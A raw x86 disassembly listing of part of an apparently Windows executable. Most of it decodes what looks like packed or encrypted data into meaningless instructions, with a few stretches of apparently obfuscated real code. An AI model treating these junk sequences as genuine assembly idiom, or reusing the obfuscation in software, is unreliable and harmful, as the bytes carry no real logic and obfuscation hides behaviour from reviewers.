  40b67d:	cmp    ecx,eax
  40b67f:	jne    0x40b0ab
  40b685:	pop    edi
  40b686:	pop    esi
  40b687:	pop    ebx
  40b688:	leave  
  40b689:	ret    0xc
  40b68c:	push   ebp
  40b68d:	mov    ebp,esp
  40b68f:	sub    esp,0xec
  40b695:	push   ebx
  40b696:	push   esi
  40b697:	mov    DWORD PTR [ebp-0x8],0x548e
  40b69e:	jmp    0x40baa9
  40b6a3:	or     DWORD PTR [edx],ebx
  40b6a5:	or     eax,DWORD PTR [edi]
  40b6a7:	sbb    al,0x18
  40b6a9:	or     DWORD PTR [eax+ebp*4],ebx
  40b6ac:	mov    ds:0xdded9e60,eax
  40b6b1:	ror    edi,0x9a
  40b6b4:	mov    bh,0xbe
  40b6b6:	mov    esi,0xbebec492
  40b6bb:	push   esi
  40b6bc:	jl     0x40b694
  40b6be:	ret    
  40b6bf:	jge    0x40b644
  40b6c1:	pusha  
  40b6c2:	leave  
  40b6c3:	icebp  
  40b6c4:	daa    
  40b6c5:	mov    ah,0x9f
  40b6c7:	pop    edi
  40b6c8:	in     al,dx
  40b6c9:	pop    edi
  40b6ca:	data16 mov ah,0x1e
  40b6cd:	inc    ebx
  40b6ce:	adc    ecx,DWORD PTR es:[esi+0x34]
  40b6d2:	dec    ebx
  40b6d3:	ficom  WORD PTR [eax-0x6d]
  40b6d6:	add    eax,0xfaf799f9
  40b6db:	nop
  40b6dc:	stc    
  40b6dd:	les    edi,FWORD PTR ds:0x50ca02c3
  40b6e3:	aas    
  40b6e4:	mov    ecx,0xc04419ee
  40b6e9:	pop    ss
  40b6ea:	or     al,0x51
  40b6ec:	retf   
  40b6ed:	adc    eax,0x1bf609cc
  40b6f2:	inc    edx
  40b6f3:	push   edi
  40b6f4:	out    0x76,eax
  40b6f6:	clc    
  40b6f7:	pop    esi
  40b6f8:	xchg   esp,eax
  40b6f9:	cdq    
  40b6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6fb:	mov    ecx,0xf70001f3
  40b700:	or     DWORD PTR [esi+0x65ec03b5],edx
  40b706:	and    BYTE PTR [edx-0x78],0xe2
  40b70a:	mov    al,0x5a
  40b70c:	inc    ebp
  40b70d:	inc    edi
  40b70e:	xor    eax,0xac3b5fe7
  40b713:	mov    WORD PTR [ebx-0x7e],ds
  40b716:	es inc esp
  40b718:	cmp    DWORD PTR [ecx+0x131bb384],eax
  40b71e:	je     0x40b739
  40b720:	dec    esi
  40b721:	push   esp
  40b722:	in     eax,dx
  40b723:	and    BYTE PTR [esp+esi*4+0x465f5567],dl
  40b72a:	sub    al,0xe8
  40b72c:	sub    eax,0x82474199
  40b731:	xor    DWORD PTR [ebx],ecx
  40b733:	xor    BYTE PTR [esp+ecx*8-0x473bd027],bh
  40b73a:	cmp    eax,0xc71561ea
  40b73f:	jge    0x40b6c1
  40b741:	mov    ds:0xd0b10b40,eax
  40b746:	pop    ecx
  40b747:	lds    ebx,FWORD PTR [ecx-0x46]
  40b74a:	scas   eax,DWORD PTR es:[edi]
  40b74b:	inc    ecx
  40b74c:	ror    BYTE PTR [ecx+0x67],cl
  40b74f:	jl     0x40b6d5
  40b751:	in     al,0x2f
  40b753:	adc    DWORD PTR [edx-0x55],0xffffffd9
  40b757:	or     ch,ah
  40b759:	mov    ds:0xbed2c2c7,eax
  40b75e:	lahf   
  40b75f:	mov    esp,cs
  40b761:	sbb    ecx,ebx
  40b763:	(bad)
  40b767:	jns    0x40b73b
  40b769:	xlat   BYTE PTR ds:[ebx]
  40b76a:	inc    ebx
  40b76b:	xchg   esi,eax
  40b76c:	outs   dx,DWORD PTR ds:[esi]
  40b76d:	mov    al,0xf0
  40b76f:	ins    BYTE PTR es:[edi],dx
  40b770:	mov    WORD PTR [esi-0x2c],?
  40b773:	xchg   edx,eax
  40b774:	data16 (bad) 
  40b776:	aaa    
  40b777:	inc    ecx
  40b778:	pop    esp
  40b779:	dec    ebp
  40b77a:	jmp    0x20467e17
  40b77f:	les    edi,FWORD PTR [ecx]
  40b781:	dec    esp
  40b782:	sub    bl,dh
  40b784:	lahf   
  40b785:	push   esi
  40b786:	mov    DWORD PTR [eax+esi*2],ecx
  40b789:	test   al,bh
  40b78b:	mov    BYTE PTR [edi],bh
  40b78d:	add    cl,BYTE PTR [edx+0x5b7b5a20]
  40b793:	sar    bh,cl
  40b795:	mov    edi,0x1796ed76
  40b79a:	neg    BYTE PTR [edi+0x561f41b3]
  40b7a0:	aaa    
  40b7a1:	and    eax,0x3a59625b
  40b7a6:	in     eax,0x98
  40b7a8:	add    DWORD PTR [esi+0x1e9157f5],edi
  40b7ae:	retf   0x9c6a
  40b7b1:	hlt    
  40b7b2:	ret    
  40b7b3:	out    dx,al
  40b7b4:	cdq    
  40b7b5:	or     eax,eax
  40b7b7:	js     0x40b759
  40b7b9:	enter  0x2094,0x25
  40b7bd:	mov    dl,0x0
  40b7bf:	adc    eax,0xfbb21fe6
  40b7c4:	in     eax,dx
  40b7c5:	cmp    bh,BYTE PTR [ebx]
  40b7c7:	xchg   edi,eax
  40b7c8:	fdiv   QWORD PTR [ebp-0x63]
  40b7cb:	aam    0x12
  40b7cd:	ret    
  40b7ce:	imul   ebx,DWORD PTR [eax],0x22
  40b7d1:	(bad)
  40b7d5:	cmp    bl,BYTE PTR [ecx+edi*1-0x31]
  40b7d9:	outs   dx,DWORD PTR fs:[esi]
  40b7db:	pop    es
  40b7dc:	push   0x2
  40b7de:	sbb    dl,al
  40b7e0:	pop    edx
  40b7e1:	psrlq  mm6,QWORD PTR [ebx]
  40b7e4:	push   0x6d9f0379
  40b7e9:	mov    esp,0x6144b1ed
  40b7ee:	pop    ebx
  40b7ef:	add    esi,DWORD PTR [ebx+0x1bfd0cf2]
  40b7f5:	leave  
  40b7f6:	sbb    DWORD PTR [ebp-0x44],edx
  40b7f9:	jmp    0x2b1c590
  40b7fe:	xchg   esp,eax
  40b7ff:	les    esp,FWORD PTR [eax]
  40b801:	jg     0x40b7cc
  40b803:	imul   edx,DWORD PTR [ebp+0x47],0x1c
  40b807:	add    BYTE PTR [ecx-0x51],0xef
  40b80b:	out    0xdf,al
  40b80d:	mov    WORD PTR [ecx-0xe72da47],ds
  40b813:	adc    ch,dh
  40b815:	push   0x51
  40b817:	add    BYTE PTR [eax],ch
  40b819:	push   ebx
  40b81a:	call   0xa180:0xedf2a79c
  40b821:	jmp    0xaa37:0xe32c9ebe
  40b828:	sbb    BYTE PTR [edi-0x23fb8f0f],0xba
  40b82f:	cmp    eax,0xd6025385
  40b834:	push   es
  40b835:	jb     0x40b873
  40b837:	pop    edx
  40b838:	daa    
  40b839:	stos   DWORD PTR es:[edi],eax
  40b83a:	jge    0x40b823
  40b83c:	out    0x60,al
  40b83e:	les    edi,FWORD PTR [edx-0x27beaf9b]
  40b844:	fs xchg edi,eax
  40b846:	(bad)  [ebx+0x46]
  40b849:	or     dl,dl
  40b84b:	push   esp
  40b84c:	pop    edx
  40b84d:	xchg   DWORD PTR [ecx],ebp
  40b84f:	jns    0x40b88e
  40b851:	mov    dl,0x63
  40b853:	imul   esi,DWORD PTR [edi],0x156c1774
  40b859:	mov    DWORD PTR [edx+0x31b5f5b3],0xdc0f6d2d
  40b863:	push   ss
  40b864:	into   
  40b865:	and    esi,DWORD PTR [edi+esi*1]
  40b868:	xlat   BYTE PTR ds:[ebx]
  40b869:	fisttp WORD PTR [ecx-0x3c5680f1]
  40b86f:	inc    eax
  40b870:	add    edx,eax
  40b872:	shl    DWORD PTR [edi+0x3bfa2bf5],cl
  40b878:	lahf   
  40b879:	push   0xffffff92
  40b87b:	push   es
  40b87c:	retf   0x9638
  40b87f:	mov    bl,0x6
  40b881:	lods   eax,DWORD PTR ds:[esi]
  40b882:	ja     0x40b8b6
  40b884:	mov    ebx,0x1e293d90
  40b889:	paddusb mm2,QWORD PTR [ebp-0x41ffa39e]
  40b890:	inc    edi
  40b891:	in     eax,dx
  40b892:	outs   dx,DWORD PTR ds:[esi]
  40b893:	dec    ecx
  40b894:	sub    ebx,eax
  40b896:	je     0x40b909
  40b898:	xor    eax,0x97f6199d
  40b89d:	add    bl,0x3a
  40b8a0:	sbb    bl,dl
  40b8a2:	nop
  40b8a3:	add    edi,DWORD PTR [ebp+0x68be6e4]
  40b8a9:	and    al,0xd7
  40b8ab:	and    eax,DWORD PTR [edx+0x389057f9]
  40b8b1:	fld    st(4)
  40b8b3:	ror    DWORD PTR [edx+0x65bedaca],cl
  40b8b9:	ins    DWORD PTR es:[edi],dx
  40b8ba:	xor    eax,0x5bf8e67d
  40b8bf:	pop    es
  40b8c0:	jmp    0xa08c3762
  40b8c5:	gs cwde 
  40b8c7:	clc    
  40b8c8:	addr16 add al,0xe8
  40b8cb:	mov    esp,0x8e975856
  40b8d0:	aaa    
  40b8d1:	and    BYTE PTR [ecx],0xb3
  40b8d4:	sbb    dh,BYTE PTR [esi]
  40b8d6:	fnstcw WORD PTR [esi]
  40b8d8:	sub    eax,0xa262d66d
  40b8dd:	push   ss
  40b8de:	and    eax,0x34f69684
  40b8e3:	push   ebp
  40b8e4:	pop    ss
  40b8e5:	pop    ebp
  40b8e6:	and    BYTE PTR [edx-0x7093ac60],dl
  40b8ec:	jb     0x40b905
  40b8ee:	mov    DWORD PTR [ebx+0x78],ebp
  40b8f1:	test   eax,0xc42455cf
  40b8f6:	fisttp WORD PTR [edx-0x73338cbe]
  40b8fc:	les    eax,FWORD PTR [esi-0x6d]
  40b8ff:	jno    0x40b8b3
  40b901:	adc    eax,DWORD PTR [ecx-0xf]
  40b904:	aam    0xae
  40b906:	add    ah,ah
  40b908:	add    DWORD PTR [esi],0xc4285dc
  40b90e:	cs xchg ebp,eax
  40b910:	ss (bad) 
  40b912:	jmp    0x40b974
  40b914:	xchg   ecx,eax
  40b915:	(bad)  
  40b917:	adc    bl,cl
  40b919:	sub    ah,BYTE PTR [eax+0x51dfc0f8]
  40b91f:	push   ecx
  40b920:	mov    dl,0x4f
  40b922:	sbb    eax,0x1973d66a
  40b927:	jmp    0xb6c2:0x58abe22c
  40b92e:	adc    eax,0x505517ef
  40b933:	clc    
  40b934:	leave  
  40b935:	lods   al,BYTE PTR ds:[esi]
  40b936:	test   BYTE PTR [eax],dh
  40b938:	not    DWORD PTR [edx+0x1f]
  40b93b:	jno    0x40b92d
  40b93d:	enter  0xa0ea,0x52
  40b941:	dec    eax
  40b942:	sub    al,0xda
  40b944:	mov    ebp,0xb21b223c
  40b949:	pop    edi
  40b94a:	mov    al,0xf2
  40b94c:	and    ch,BYTE PTR [ebp-0x80]
  40b94f:	push   ebx
  40b950:	sbb    esp,0xffffffc1
  40b953:	xor    cl,cl
  40b955:	ins    DWORD PTR es:[edi],dx
  40b956:	jg     0x40b942
  40b958:	mov    DWORD PTR [edi-0x244efb5b],esp
  40b95e:	push   ds
  40b95f:	fcomp  QWORD PTR [edx-0x2a14181d]
  40b965:	adc    eax,eax
  40b967:	adc    al,0x1e
  40b969:	out    0xa2,eax
  40b96b:	or     bl,BYTE PTR [ebx+0x1]
  40b96e:	mov    edi,DWORD PTR [edi+0x5f4a0d35]
  40b974:	dec    ecx
  40b975:	imul   edi,esi,0x0
  40b978:	adc    eax,0x2f4f9bdf
  40b97d:	adc    BYTE PTR [ebx],bl
  40b97f:	push   0x26122e24
  40b984:	sar    BYTE PTR [edx-0x21c9a45c],0xa4
  40b98b:	mov    al,ds:0x7e52525
  40b990:	lock jae 0x40b9f9
  40b993:	das    
  40b994:	and    al,0xc4
  40b996:	adc    eax,0xd4b7b956
  40b99b:	add    cl,BYTE PTR [ebx-0x7d236f27]
  40b9a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9a2:	sbb    eax,0xb713fc09
  40b9a7:	xor    cl,BYTE PTR [ebp+0x33]
  40b9aa:	imul   DWORD PTR [ebp-0x7c02b91]
  40b9b0:	es mov eax,0x2600857a
  40b9b6:	inc    ecx
  40b9b7:	les    edx,FWORD PTR [edx+eax*8]
  40b9ba:	mov    eax,ds:0x93a6f27f
  40b9bf:	imul   ecx,eax,0xbafc1c6c
  40b9c5:	in     al,dx
  40b9c6:	add    BYTE PTR [edx-0x6c],al
  40b9c9:	fldenv [edx+ecx*4+0x54]
  40b9cd:	pop    es
  40b9ce:	xchg   ecx,eax
  40b9cf:	pop    edx
  40b9d0:	dec    ecx
  40b9d1:	call   0xba88:0x7b52e506
  40b9d8:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9da:	aam    0x67
  40b9dc:	and    eax,0x31945f72
  40b9e1:	jnp    0x40b9b5
  40b9e3:	xor    esi,DWORD PTR [esp+eax*2]
  40b9e6:	mov    ds:0xe805358a,eax
  40b9eb:	add    DWORD PTR [ebx-0x367bf655],0xc31d061d
  40b9f5:	fadd   DWORD PTR [edx]
  40b9f7:	sub    al,BYTE PTR [esi]
  40b9f9:	xlat   BYTE PTR ds:[ebx]
  40b9fa:	jge    0x40b9dd
  40b9fc:	ret    
  40b9fd:	jb     0x40b9a6
  40b9ff:	dec    esp
  40ba00:	loop   0x40b9c1
  40ba02:	push   esp
  40ba03:	mov    BYTE PTR [esp+ebx*4+0x16],bl
  40ba07:	lods   al,BYTE PTR ds:[esi]
  40ba08:	frstor [esp+eax*2-0x142ec04d]
  40ba0f:	pop    ecx
  40ba10:	push   0x42afee99
  40ba15:	enter  0xf63f,0x41
  40ba19:	fdivp  st(7),st
  40ba1b:	es js  0x40ba97
  40ba1e:	or     BYTE PTR [edx-0x4957572b],ch
  40ba24:	das    
  40ba25:	xchg   BYTE PTR [eax],al
  40ba27:	test   al,0xbe
  40ba29:	hlt    
  40ba2a:	adc    eax,0xf1036a9
  40ba2f:	ret    0x330c
  40ba32:	mov    cl,0x3a
  40ba34:	or     BYTE PTR [esi],ah
  40ba36:	mov    WORD PTR [ecx+ecx*4-0x34dc574b],es
  40ba3d:	popa   
  40ba3e:	push   ebx
  40ba3f:	add    al,0xfe
  40ba41:	inc    edi
  40ba42:	daa    
  40ba43:	xchg   DWORD PTR [edx-0xa],esi
  40ba46:	mov    DWORD PTR [ebx-0x5d],ecx
  40ba49:	sahf   
  40ba4a:	adc    al,0xd5
  40ba4c:	mov    esi,0x8698d2ce
  40ba51:	aad    0x23
  40ba53:	aad    0x4c
  40ba55:	cwde   
  40ba56:	mov    bh,0xa
  40ba58:	(bad)  
  40ba5a:	mov    eax,ds:0x968993c
  40ba5f:	xchg   edx,eax
  40ba60:	dec    edx
  40ba61:	cs xor ebx,edi
  40ba64:	mov    edx,0xbbb6c5a6
  40ba69:	pop    esp
  40ba6a:	in     eax,dx
  40ba6b:	lahf   
  40ba6c:	jl     0x40ba29
  40ba6e:	out    0xa3,al
  40ba70:	out    0x58,al
  40ba72:	mov    DWORD PTR ds:0x68df9043,0xe2b052bc
  40ba7c:	sbb    al,0x7e
  40ba7e:	push   edi
  40ba7f:	push   ecx
  40ba80:	loope  0x40ba5b
  40ba82:	jg     0x40bab1
  40ba84:	sub    al,0xea
  40ba86:	retf   
  40ba87:	push   0x7814eda
  40ba8c:	xchg   edi,eax
  40ba8d:	push   eax
  40ba8e:	jno    0x40bab4
  40ba90:	inc    esp
  40ba91:	jbe    0x40baf9
  40ba93:	ins    BYTE PTR es:[edi],dx
  40ba94:	dec    ebx
  40ba95:	mov    bl,0xf
  40ba97:	popa   
  40ba98:	push   cs
  40ba99:	sahf   
  40ba9a:	daa    
  40ba9b:	cdq    
  40ba9c:	psrlw  mm2,QWORD PTR [bp+si+0x7eaa]
  40baa2:	js     0x40bb17
  40baa4:	and    DWORD PTR [ebp-0x75],0x19
  40baa8:	add    bh,0x45
  40baab:	cld    
  40baac:	ret    0x61
  40baaf:	add    BYTE PTR [ebx+0x4d8bfc45],cl
  40bab5:	clc    
  40bab6:	add    eax,0x1ca5
  40babb:	or     eax,ecx
  40babd:	mov    ecx,DWORD PTR ds:0x4226b8
  40bac3:	lea    eax,[eax+ecx*1-0x7eef]
  40baca:	mov    DWORD PTR [ebp-0x5c],eax
  40bacd:	mov    DWORD PTR [ebp-0x4],0x8ea
  40bad4:	mov    DWORD PTR [ebp-0x8],0x5759
  40badb:	mov    eax,DWORD PTR [ebp-0x8]
  40bade:	mov    ecx,DWORD PTR [ebp-0x4]
  40bae1:	and    eax,0x27f6
  40bae6:	xor    eax,ecx
  40bae8:	mov    ecx,DWORD PTR ds:0x4227ec
  40baee:	imul   eax,eax,0x18
  40baf1:	xor    eax,0x17970
  40baf6:	lea    eax,[ebp+eax*1-0x54]
  40bafa:	mov    DWORD PTR [eax],ecx
  40bafc:	jmp    0x40bf07
  40bb01:	retf   0xf4e7
  40bb04:	leave  
  40bb05:	hlt    
  40bb06:	fsincos 
  40bb08:	out    0xad,eax
  40bb0a:	and    dl,BYTE PTR [edx-0x62]
  40bb0d:	mov    esi,0x6e9e14da
  40bb12:	mov    edi,0xc492bebe
  40bb17:	mov    esi,0x120c18be
  40bb1c:	mov    ecx,DWORD PTR [edx+0x15d8091]
  40bb22:	leave  
  40bb23:	xlat   BYTE PTR ds:[ebx]
  40bb24:	in     eax,dx
  40bb25:	jae    0x40baef
  40bb27:	sub    ebp,DWORD PTR [ecx-0x37abba6d]
  40bb2d:	mov    al,ds:0x697ca455
  40bb32:	push   esp
  40bb33:	scas   al,BYTE PTR es:[edi]
  40bb34:	in     eax,dx
  40bb35:	mov    eax,ds:0x3dbb43d9
  40bb3a:	dec    esi
  40bb3b:	cmp    eax,0x1b9c9233
  40bb40:	stc    
  40bb41:	out    dx,al
  40bb42:	and    DWORD PTR [ecx-0x2c9fe068],ebx
  40bb48:	sub    eax,0x59748393
  40bb4d:	push   ebx
  40bb4e:	test   BYTE PTR [ebp-0x78],dh
  40bb51:	and    BYTE PTR [edx-0x33],ah
  40bb54:	add    al,0xa9
  40bb56:	mov    ebx,0xf672e355
  40bb5b:	jg     0x40bb11
  40bb5d:	out    0xfd,eax
  40bb5f:	mov    dh,bh
  40bb61:	ror    DWORD PTR [edx+0x72],1
  40bb64:	mov    ebx,0x696f7ee7
  40bb69:	cmp    DWORD PTR [eax-0x25],edi
  40bb6c:	pop    es
  40bb6d:	inc    ebp
  40bb6e:	or     eax,0xd4c1b72c
  40bb73:	and    al,0xc4
  40bb75:	mov    ecx,0x396048b1
  40bb7a:	fdivr  DWORD PTR [edx+0x2f8264a0]
  40bb80:	aaa    
  40bb81:	mov    ss,WORD PTR [ebx+0x7b7bfb14]
  40bb87:	ficom  WORD PTR [eax+0x7400212c]
  40bb8d:	add    dl,BYTE PTR [ebx-0x4bf840d7]
  40bb93:	lods   eax,DWORD PTR ds:[esi]
  40bb94:	lahf   
  40bb95:	adc    DWORD PTR [eax-0x173a2114],ebp
  40bb9b:	cmp    ecx,DWORD PTR [esi]
  40bb9d:	or     al,0x9b
  40bb9f:	cmp    DWORD PTR [esi-0x78],eax
  40bba2:	ds dec eax
  40bba4:	pop    esi
  40bba5:	mov    ?,WORD PTR [esi+0x42]
  40bba8:	into   
  40bba9:	mov    ebp,0x9411cdf1
  40bbae:	loope  0x40bb38
  40bbb0:	and    DWORD PTR [eax-0x14fba5b],eax
  40bbb6:	scas   eax,DWORD PTR es:[edi]
  40bbb7:	call   FWORD PTR [ecx]
  40bbb9:	pop    es
  40bbba:	xchg   BYTE PTR [edi+0xc412ae2],ch
  40bbc0:	cmc    
  40bbc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbc2:	jmp    0xa32a:0x4662f65b
  40bbc9:	xchg   ecx,eax
  40bbca:	mov    ebx,es
  40bbcc:	std    
  40bbcd:	mov    ah,0xb1
  40bbcf:	dec    eax
  40bbd0:	stc    
  40bbd1:	or     DWORD PTR [edi],eax
  40bbd3:	inc    esp
  40bbd4:	cmc    
  40bbd5:	push   ss
  40bbd6:	sbb    ch,BYTE PTR [edi-0x12]
  40bbd9:	mov    ecx,0xae3a4b02
  40bbde:	push   eax
  40bbdf:	jle    0x40bbcd
  40bbe1:	fdiv   st,st(7)
  40bbe3:	repz mov esi,0x5867a4f0
  40bbe9:	mov    esi,0xcfeedd7d
  40bbee:	xor    DWORD PTR [esi+0x26],esi
  40bbf1:	loopne 0x40bc38
  40bbf3:	xlat   BYTE PTR ds:[ebx]
  40bbf4:	imul   ebp
  40bbf6:	imul   ebp,eax,0x15
  40bbf9:	fdiv   QWORD PTR [ebx+0x36]
  40bbfc:	jge    0x40bba6
  40bbfe:	inc    eax
  40bbff:	data16 daa 
  40bc01:	ficomp DWORD PTR [edx-0x467709c0]
  40bc07:	stos   BYTE PTR es:[edi],al
  40bc08:	jns    0x40bbb1
  40bc0a:	inc    edi
  40bc0b:	or     ebp,eax
  40bc0d:	retf   0x919
  40bc10:	sub    ecx,DWORD PTR [edi]
  40bc12:	mov    esi,0xca1891ab
  40bc17:	lea    ebx,[edx+0x49]
  40bc1a:	inc    esp
  40bc1b:	mov    dl,0x66
  40bc1d:	and    BYTE PTR [esi],bh
  40bc1f:	test   BYTE PTR [eax-0x72],ah
  40bc22:	fwait
  40bc23:	add    eax,0xe80760cb
  40bc28:	jecxz  0x40bbf4
  40bc2a:	jno    0x40bc30
  40bc2c:	out    0x1b,eax
  40bc2e:	jp     0x40bc26
  40bc30:	sbb    BYTE PTR [ebp-0x16],bh
  40bc33:	ss (bad) 
  40bc35:	push   0xffffffd7
  40bc37:	or     al,0xa8
  40bc39:	inc    edi
  40bc3a:	xlat   BYTE PTR ds:[ebx]
  40bc3b:	mov    eax,0xa26a6380
  40bc40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc41:	sbb    DWORD PTR [esi],edi
  40bc43:	out    dx,al
  40bc44:	sub    eax,0xd0c68257
  40bc49:	leave  
  40bc4a:	loopne 0x40bc75
  40bc4c:	sbb    ebx,ebp
  40bc4e:	mov    cl,0xcc
  40bc50:	lahf   
  40bc51:	std    
  40bc52:	inc    esi
  40bc53:	mov    al,ds:0x38a0e508
  40bc58:	pop    ecx
  40bc59:	out    dx,eax
  40bc5a:	aam    0x5d
  40bc5c:	loopne 0x40bc12
  40bc5e:	pop    eax
  40bc5f:	xchg   esi,eax
  40bc60:	lock inc si
  40bc63:	pop    esp
  40bc64:	aam    0xe
  40bc66:	aad    0x79
  40bc68:	cmp    al,0xca
  40bc6a:	cmp    DWORD PTR [edx-0x2a],ecx
  40bc6d:	fstp   TBYTE PTR [eax]
  40bc6f:	stos   BYTE PTR es:[edi],al
  40bc70:	adc    esp,DWORD PTR [esi+0x45b8fb92]
  40bc76:	and    edi,edi
  40bc78:	or     DWORD PTR [esi+0x61b98607],ecx
  40bc7e:	mov    edi,0xd3838c0c
  40bc83:	mov    al,0x73
  40bc85:	call   0xb6c49b37
  40bc8a:	(bad)  
  40bc8b:	adc    ch,BYTE PTR [edi+eiz*4+0x787ff1c7]
  40bc92:	mov    ah,0x4a
  40bc94:	outs   dx,BYTE PTR ds:[esi]
  40bc95:	fst    DWORD PTR [esi+esi*1-0x4f]
  40bc99:	loopne 0x40bc55
  40bc9b:	xor    al,0x2a
  40bc9d:	mov    ebp,0xb9aee377
  40bca2:	fmul   DWORD PTR [ebx+eax*1]
  40bca5:	xor    al,BYTE PTR [ecx+0x44]
  40bca8:	jge    0x40bc47
  40bcaa:	mov    ecx,0x33cd23e2
  40bcaf:	mov    BYTE PTR [edi],dl
  40bcb1:	mov    eax,0x6a396b2
  40bcb6:	icebp  
  40bcb7:	mov    bh,0xac
  40bcb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcba:	hlt    
  40bcbb:	leave  
  40bcbc:	push   0x21
  40bcbe:	pop    esi
  40bcbf:	push   ebx
  40bcc0:	sti    
  40bcc1:	jnp    0x40bc52
  40bcc3:	arpl   WORD PTR ds:0xa2b86e7c,sp
  40bcc9:	jmp    0xb006a94a
  40bcce:	cmp    cl,0x29
  40bcd1:	lahf   
  40bcd2:	sti    
  40bcd3:	aas    
  40bcd4:	mov    dh,0x0
  40bcd6:	test   DWORD PTR [esi-0x25],edx
  40bcd9:	mov    esi,0x69fcc68c
  40bcde:	ins    DWORD PTR es:[edi],dx
  40bcdf:	pop    eax
  40bce0:	mov    bl,0xbb
  40bce2:	mov    dh,0x57
  40bce4:	test   eax,0xdbfdd3d6
  40bce9:	xchg   esp,eax
  40bcea:	inc    ebx
  40bceb:	test   eax,0x67e59a8
  40bcf0:	fcom   QWORD PTR [edi]
  40bcf2:	adc    DWORD PTR [esi*2-0x799942b],eax
  40bcf9:	inc    edx
  40bcfa:	add    edx,DWORD PTR fs:[ecx+0x42d7ca91]
  40bd01:	call   0x1d86b7fd
  40bd06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd07:	push   esp
  40bd08:	jmp    FWORD PTR [eax+0x39]
  40bd0b:	sub    al,0x84
  40bd0d:	sub    ah,BYTE PTR [eax+0x4d]
  40bd10:	inc    edi
  40bd11:	jp     0x40bd5e
  40bd13:	leave  
  40bd14:	push   ebx
  40bd15:	xor    al,0xdf
  40bd17:	ss inc ecx
  40bd19:	push   edx
  40bd1a:	push   ss
  40bd1b:	mov    fs,WORD PTR fs:[eax+0x408353d7]
  40bd22:	dec    ecx
  40bd23:	and    eax,0x2768f485
  40bd28:	repz inc esi
  40bd2a:	stc    
  40bd2b:	push   ebp
  40bd2c:	int    0xd
  40bd2e:	mov    ?,WORD PTR [esi]
  40bd30:	pushf  
  40bd31:	mov    al,BYTE PTR [ecx-0x68655243]
  40bd37:	mov    al,0x54
  40bd39:	imul   DWORD PTR [edi]
  40bd3b:	in     al,0xa7
  40bd3d:	dec    eax
  40bd3e:	add    eax,0xc7b2934f
  40bd43:	leave  
  40bd44:	aaa    
  40bd45:	fcmovnu st,st(4)
  40bd47:	std    
  40bd48:	push   edx
  40bd49:	and    DWORD PTR ds:0x184562ed,edi
  40bd4f:	sub    DWORD PTR [edi+0x14],ebx
  40bd52:	adc    ecx,ecx
  40bd54:	jg     0x40bd35
  40bd56:	cmp    eax,DWORD PTR [edi]
  40bd58:	jmp    0xc8ce:0xe03b7535
  40bd5f:	pop    es
  40bd60:	mov    ebx,0x96822ad5
  40bd65:	sbb    bh,BYTE PTR [ebx-0x39]
  40bd68:	call   0xc1a8b2ba
  40bd6d:	test   BYTE PTR [ecx],ch
  40bd6f:	lea    esp,[edx+0x7d532d8c]
  40bd75:	sbb    al,0x40
  40bd77:	mov    esi,0x606731a8
  40bd7c:	push   eax
  40bd7d:	and    DWORD PTR [esi-0x4bf3ff2f],esi
  40bd83:	and    eax,0x34a535da
  40bd88:	arpl   WORD PTR [edx+eax*1+0x10913977],bp
  40bd8f:	or     esi,DWORD PTR [ecx-0x5f]
  40bd92:	stc    
  40bd93:	imul   esi,DWORD PTR [edx+0x4de75358],0xffffff91
  40bd9a:	push   0xffffffce
  40bd9c:	mov    ds:0x8843a971,eax
  40bda1:	cwde   
  40bda2:	jecxz  0x40bdf1
  40bda4:	sbb    al,0x23
  40bda6:	adc    dh,BYTE PTR [edi-0x6d]
  40bda9:	mov    dh,0xef
  40bdab:	jae    0x40bd61
  40bdad:	jno    0x40bdad
  40bdaf:	jbe    0x40bdd3
  40bdb1:	in     eax,0x42
  40bdb3:	cmp    bl,BYTE PTR [edx]
  40bdb5:	add    eax,0xdafb2796
  40bdba:	pop    ebp
  40bdbb:	jge    0x40be0f
  40bdbd:	pop    ebx
  40bdbe:	inc    esp
  40bdbf:	gs mov ebx,0x561bd51f
  40bdc5:	ins    DWORD PTR es:[edi],dx
  40bdc6:	ins    DWORD PTR es:[edi],dx
  40bdc7:	cmp    al,0x25
  40bdc9:	mov    ds:0x22759d9f,eax
  40bdce:	rol    BYTE PTR [edi],0x13
  40bdd1:	dec    esi
  40bdd2:	imul   ebx,DWORD PTR [esi],0x349e17a5
  40bdd8:	inc    ebx
  40bdd9:	ins    DWORD PTR es:[edi],dx
  40bdda:	and    ecx,DWORD PTR [eax-0x6d9f06e6]
  40bde0:	push   0xc0be4752
  40bde5:	aaa    
  40bde6:	fst    QWORD PTR [ebx+eiz*4+0x12f21933]
  40bded:	mov    eax,0x4c8dcdfd
  40bdf2:	xor    ah,bh
  40bdf4:	lock inc esp
  40bdf6:	push   0xffffff9c
  40bdf8:	fstp   QWORD PTR [eax-0x2780cefa]
  40bdfe:	cmp    esi,DWORD PTR [edi]
  40be00:	mov    ds,WORD PTR [eax]
  40be02:	sar    BYTE PTR [ebp-0x17],cl
  40be05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be07:	xor    ecx,DWORD PTR [ecx-0x686991d7]
  40be0d:	imul   edi,DWORD PTR [bx+0x15],0x7070e426
  40be15:	inc    edi
  40be16:	mov    edx,0x284c52c
  40be1b:	inc    ebx
  40be1c:	mov    edi,0xcd5fde91
  40be21:	cs cmp al,0xe4
  40be24:	sti    
  40be25:	sbb    eax,0xd5e0e194
  40be2a:	nop
  40be2b:	pop    esp
  40be2c:	add    DWORD PTR [ebx-0x23],ebx
  40be2f:	dec    esp
  40be30:	jns    0x40bdbf
  40be32:	mov    BYTE PTR [ebx],bl
  40be34:	sub    DWORD PTR [eax+0x2b14d31d],eax
  40be3a:	mov    edi,0x8a1df8ed
  40be3f:	sbb    ebx,DWORD PTR [edx+0x6d]
  40be42:	outs   dx,DWORD PTR ds:[esi]
  40be43:	jl     0x40be9c
  40be45:	(bad)  
  40be46:	xchg   esi,eax
  40be47:	pop    esp
  40be48:	ins    DWORD PTR es:[edi],dx
  40be49:	push   ebx
  40be4a:	in     eax,0xfd
  40be4c:	sti    
  40be4d:	pop    ds
  40be4e:	rcr    dl,cl
  40be50:	lock retf 
